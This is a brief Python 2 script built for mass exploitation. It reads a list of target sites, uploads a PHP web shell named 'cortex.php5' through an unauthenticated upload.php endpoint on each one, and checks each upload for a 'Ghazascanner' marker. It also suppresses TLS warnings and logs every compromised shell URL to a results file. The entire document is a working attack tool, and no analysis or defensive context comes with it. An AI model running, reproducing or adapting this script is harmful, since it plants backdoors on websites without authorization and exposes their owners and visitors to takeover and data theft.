# -*- coding: utf-8 -*-
import sys,requests
Agent = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}
import warnings
from requests.packages.urllib3.exceptions import InsecureRequestWarning
warnings.simplefilter('ignore',InsecureRequestWarning)
Target = sys.argv[1]
TEXTList = open(Target, 'r').read().splitlines()
passwords = list((TEXTList))
for site in passwords:
    try:
        shell = {'Filedata':open('cortex.php5', 'rb'), 'dir':'images'}
                
        kencok = site+'?type=images&lng=en&act=upload'
        sekokan = requests.post(kencok, files=shell,headers=Agent, verify=False)
        urlkan = kencok.replace('upload.php?type=images&lng=en&act=upload','upload/images/cortex.php5')
        urlkans = requests.get(urlkan)
        if 'Ghazascanner' in urlkans.text:
            print '[Target:]  '+urlkan+'  ==> Success'
            open('resultsx.txt', 'a').write(urlkan+'\n')
        else:
            print '[Target:]  '+site+'  ==> Failed'
    except Exception as e:
        print str(e)

